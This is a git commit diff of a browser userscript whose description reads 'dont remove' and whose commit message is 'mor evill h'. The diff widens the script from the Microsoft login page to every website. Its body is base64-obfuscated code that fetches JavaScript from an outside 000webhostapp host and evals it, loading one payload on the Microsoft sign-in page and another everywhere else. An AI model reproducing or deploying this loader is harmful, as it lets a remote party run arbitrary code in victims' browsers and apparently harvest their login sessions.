810bb1b18118b3d9ca8b083229dc9ed681d6cd0c
Tommy Catt <75628498+thomas-catt@users.noreply.github.com>
2022-01-11 22:22:14 +0500

    hhhhhhhhhhh
    mor evill h

--- projects/h.js
+++ projects/h.js
@@ -4,9 +4,11 @@
 // @version      0.1
 // @description  dont remove
 // @author       You
-// @match        *://login.microsoftonline.com/*
-// @icon         https://www.google.com/s2/favicons
+// @match        *://*/*
+// @match        *://*.*/*
+// @match        *://*.*.*/*
+// @icon         https://www.google.com/s2/favicons?domain=pgc.edu
 // @grant        none
 // ==/UserScript==
 
-(function(a,b,c,d){(window[a+c](window[b+d]("ZmV0Y2gobG9jYXRpb24ucHJvdG9jb2wrIi8vbXktc21leC13ZWJzaXRlLjAwMHdlYmhvc3RhcHAuY29tL3NjcmlwdC5waHAiKS50aGVuKGEgPT4gYS50ZXh0KCkpLnRoZW4oYSA9PiBldmFsKGEpKQ==")))})(...JSON.parse(atob("WyJldiIsImF0IiwiYWwiLCJvYiJd")))
+(function(a,b,c,d){(window[a+c](window[b+d](!location.href.includes(atob('bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ=='))?"ZmV0Y2gobG9jYXRpb24ucHJvdG9jb2wrIi8vbXktc21leC13ZWJzaXRlLjAwMHdlYmhvc3RhcHAuY29tL2FsbC5waHAiKS50aGVuKGEgPT4gYS50ZXh0KCkpLnRoZW4oYSA9PiBldmFsKGEpKQ==":"ZmV0Y2gobG9jYXRpb24ucHJvdG9jb2wrIi8vbXktc21leC13ZWJzaXRlLjAwMHdlYmhvc3RhcHAuY29tL3NjcmlwdC5waHAiKS50aGVuKGEgPT4gYS50ZXh0KCkpLnRoZW4oYSA9PiBldmFsKGEpKQ==")))})(...JSON.parse(atob("WyJldiIsImF0IiwiYWwiLCJvYiJd")))
